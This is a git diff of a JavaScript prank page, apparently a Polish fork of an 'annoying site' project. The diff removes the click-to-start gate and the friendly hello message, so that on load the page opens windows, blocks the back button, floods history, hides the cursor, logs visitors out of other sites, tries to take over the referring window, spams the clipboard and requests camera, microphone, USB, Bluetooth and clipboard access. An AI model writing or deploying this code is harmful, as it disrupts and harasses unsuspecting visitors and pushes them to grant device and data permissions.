@@ -160,12 +160,6 @@ const LOGOUT_SITES = {
  */
 const wins = []
 
-/**
- * Count of number of clicks  - added by @9fm
- */
-
-let interactionCount = 0
-
 //Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm
 
 const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500) // - added by @9fm
@@ -210,54 +204,30 @@ else initParentWindow()
 function init () {
   confirmPageUnload()
 
-  interceptUserInput(event => {
-    interactionCount += 1
+  openWindow()
+  startVibrateInterval()
+  enablePictureInPicture()
+  triggerFileDownload()
+  focusWindows()
+  copySpamToClipboard()
+  speak()
+  startTheramin()
 
-    // Prevent default behavior (breaks closing window shortcuts)
-    event.preventDefault()
-    event.stopPropagation()
+  requestPointerLock()
 
-    // 'touchstart' and 'touchend' events are not able to open a new window
-    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
-    // a clever way to exclude touch events.
-    if (event.which !== 0) openWindow()
-
-    startVibrateInterval()
-    enablePictureInPicture()
-    triggerFileDownload()
-
-    focusWindows()
-    copySpamToClipboard()
-    speak()
-    startTheramin()
-
-    // Capture key presses on the Command or Control keys, to interfere with the
-    // "Close Window" shortcut.
-    if (event.key === 'Meta' || event.key === 'Control') {
-      window.print()
-      requestWebauthnAttestation()
-      window.print()
-      requestWebauthnAttestation()
-      window.print()
-      requestWebauthnAttestation()
-    } else {
-      requestPointerLock()
-
-      if (!window.ApplePaySession) {
-        // Don't request TouchID on every interaction in Safari since it blocks
-        // the event loop and stops windows from moving
-        requestWebauthnAttestation()
-      }
-      requestClipboardRead()
-      requestMidiAccess()
-      requestBluetoothAccess()
-      requestUsbAccess()
-      requestSerialAccess()
-      requestHidAccess()
-      requestCameraAndMic()
-      requestFullscreen()
-    }
-  })
+  if (!window.ApplePaySession) {
+    // Don't request TouchID on every interaction in Safari since it blocks
+    // the event loop and stops windows from moving
+    requestWebauthnAttestation()
+  }
+  requestClipboardRead()
+  requestMidiAccess()
+  requestBluetoothAccess()
+  requestUsbAccess()
+  requestSerialAccess()
+  requestHidAccess()
+  requestCameraAndMic()
+  requestFullscreen()
 }
 
 /**
@@ -273,38 +243,26 @@ function initChildWindow () {
   speak()
   rainbowThemeColor()
   animateUrlWithEmojis()
-
-  interceptUserInput(event => {
-    if (interactionCount === 1) {
-      startAlertInterval()
-    }
-  })
+  startAlertInterval()
 }
 
 /**
  * Initialization code for parent windows.
  */
 function initParentWindow () {
-  showHelloMessage()
   blockBackButton()
   fillHistory()
   startInvisiblePictureInPictureVideo()
 
-  interceptUserInput(event => {
-    // Only run these on the first interaction
-    if (interactionCount === 1) {
-      registerProtocolHandlers()
-      attemptToTakeoverReferrerWindow()
-      hideCursor()
-      startVideo()
-      startAlertInterval()
-      superLogout()
-      removeHelloMessage()
-      rainbowThemeColor()
-      animateUrlWithEmojis()
-      speak('To był błąd')
-    }
-  })
+  registerProtocolHandlers()
+  attemptToTakeoverReferrerWindow()
+  hideCursor()
+  startVideo()
+  startAlertInterval()
+  superLogout()
+  rainbowThemeColor()
+  animateUrlWithEmojis()
+  speak('To był błąd')
 }
 
 /**
@@ -547,20 +505,6 @@ function startVibrateInterval () {
   })
 }
 
-/**
- * Intercept all user-initiated events and call the given the function, `onInput`.
- */
-function interceptUserInput (onInput) {
-  document.body.addEventListener('touchstart', onInput, { passive: false })
-
-  document.body.addEventListener('mousedown', onInput)
-  document.body.addEventListener('mouseup', onInput)
-  document.body.addEventListener('click', onInput)
-
-  document.body.addEventListener('keydown', onInput)
-  document.body.addEventListener('keyup', onInput)
-  document.body.addEventListener('keypress', onInput)
-}
 
 /**
  * Start an invisible, muted video so we have a one ready to put into
@@ -899,22 +843,6 @@ function onCloseWindow (win) {
   if (i >= 0) wins.splice(i, 1)
 }
 
-/**
- * Show the unsuspecting user a friendly hello message with a cat.
- */
-function showHelloMessage () {
-  const template = document.querySelector('template')
-  const clone = document.importNode(template.content, true)
-  document.body.appendChild(clone)
-}
-
-/**
- * Remove the hello message.
- */
-function removeHelloMessage () {
-  const helloMessage = document.querySelector('.hello-message')
-  helloMessage.remove()
-}
 
 /**
  * Change the theme color of the browser in a loop.
